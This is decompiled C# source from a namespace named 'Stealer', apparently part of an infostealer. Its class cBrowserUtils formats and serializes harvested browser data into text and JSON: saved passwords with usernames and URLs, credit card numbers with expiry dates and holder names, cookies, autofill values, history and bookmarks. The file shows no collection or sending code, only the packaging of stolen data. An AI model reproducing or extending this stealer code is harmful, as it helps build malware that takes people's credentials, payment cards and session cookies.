using System;
using System.Collections.Generic;
using System.Text;
using Newtonsoft.Json;

namespace Stealer
{
	// Token: 0x02000009 RID: 9
	internal sealed class cBrowserUtils
	{
		// Token: 0x06000019 RID: 25 RVA: 0x00002F38 File Offset: 0x00001138
		public static DateTime UnixTimeStampToDateTime(double unixTimeStamp, bool isChrome = false)
		{
			DateTime dateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Utc);
			if (isChrome)
			{
				dateTime = new DateTime(1601, 1, 1, 0, 0, 0, 0, DateTimeKind.Utc);
			}
			dateTime = dateTime.AddSeconds(unixTimeStamp).ToLocalTime();
			return dateTime;
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00002F94 File Offset: 0x00001194
		private static string FormatPassword(Password pPassword)
		{
			return string.Format("Url: \t{0}\r\nUsername: \t{1}\r\nPassword: \t{2}\r\n\r\n", pPassword.sUrl, pPassword.sUsername, pPassword.sPassword);
		}

		// Token: 0x0600001B RID: 27 RVA: 0x00002FCC File Offset: 0x000011CC
		private static string FormatCreditCard(CreditCard cCard)
		{
			return string.Format("Type: \t{0}\r\nNumber: \t{1}\r\nExp: \t{2}\r\nHolder: \t{3}\r\n\r\n", new object[]
			{
				Banking.DetectCreditCardType(cCard.sNumber),
				cCard.sNumber,
				cCard.sExpMonth + "/" + cCard.sExpYear,
				cCard.sName
			});
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00003034 File Offset: 0x00001234
		private static string FormatCookie(Cookie cCookie)
		{
			return string.Format("Key:\t{0}\r\nPath:\t{1}\r\nExpireUtc:\t{2}\r\nName:\t{3}\r\nValue:\t{4}\r\n", new object[] { cCookie.domain, cCookie.sPath, cCookie.expirationDate, cCookie.name, cCookie.value });
		}

		// Token: 0x0600001D RID: 29 RVA: 0x00003090 File Offset: 0x00001290
		private static string FormatAutoFill(AutoFill aFill)
		{
			return string.Format("Name:\t{0}\r\nValue:\t{1}\r\n\r\n", aFill.sName, aFill.sValue);
		}

		// Token: 0x0600001E RID: 30 RVA: 0x000030C0 File Offset: 0x000012C0
		private static string FormatHistory(Site sSite)
		{
			return string.Format("Title: \t{1}\r\nUrl: \t{0}\r\nCount:\t{2}\r\n", sSite.sTitle, sSite.sUrl, sSite.iCount);
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00003100 File Offset: 0x00001300
		private static string FormatBookmark(Bookmark bBookmark)
		{
			bool flag = !string.IsNullOrEmpty(bBookmark.sUrl);
			string text;
			if (flag)
			{
				text = string.Format("Title: \t{0}\r\nUrl: \t{1}\r\n", bBookmark.sTitle, bBookmark.sUrl);
			}
			else
			{
				text = string.Format("Title: \t{0}\r\n", bBookmark.sTitle);
			}
			return text;
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00003160 File Offset: 0x00001360
		public static bool WriteCookies(List<Cookie> cCookies, StringBuilder builder)
		{
			builder.Append(JsonConvert.SerializeObject(cCookies, Formatting.Indented));
			return true;
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00003188 File Offset: 0x00001388
		public static bool WriteAutoFill(List<AutoFill> aFills, StringBuilder builder)
		{
			foreach (AutoFill autoFill in aFills)
			{
				string text = cBrowserUtils.FormatAutoFill(autoFill);
				builder.Append(text);
			}
			return true;
		}

		// Token: 0x06000022 RID: 34 RVA: 0x000031F4 File Offset: 0x000013F4
		public static bool WriteHistory(List<Site> sHistory, StringBuilder builder)
		{
			foreach (Site site in sHistory)
			{
				string text = cBrowserUtils.FormatHistory(site);
				builder.Append(text);
			}
			return true;
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00003260 File Offset: 0x00001460
		public static bool WriteBookmarks(List<Bookmark> bBookmarks, StringBuilder builder)
		{
			foreach (Bookmark bookmark in bBookmarks)
			{
				string text = cBrowserUtils.FormatBookmark(bookmark);
				builder.Append(text);
			}
			return true;
		}

		// Token: 0x06000024 RID: 36 RVA: 0x000032CC File Offset: 0x000014CC
		public static bool WritePasswords(List<Password> pPasswords, StringBuilder builder)
		{
			builder.Append(JsonConvert.SerializeObject(pPasswords, Formatting.Indented));
			return true;
		}

		// Token: 0x06000025 RID: 37 RVA: 0x000032F4 File Offset: 0x000014F4
		public static bool WriteCreditCards(List<CreditCard> cCC, StringBuilder builder)
		{
			foreach (CreditCard creditCard in cCC)
			{
				string text = cBrowserUtils.FormatCreditCard(creditCard);
				builder.Append(text);
			}
			return true;
		}
	}
}
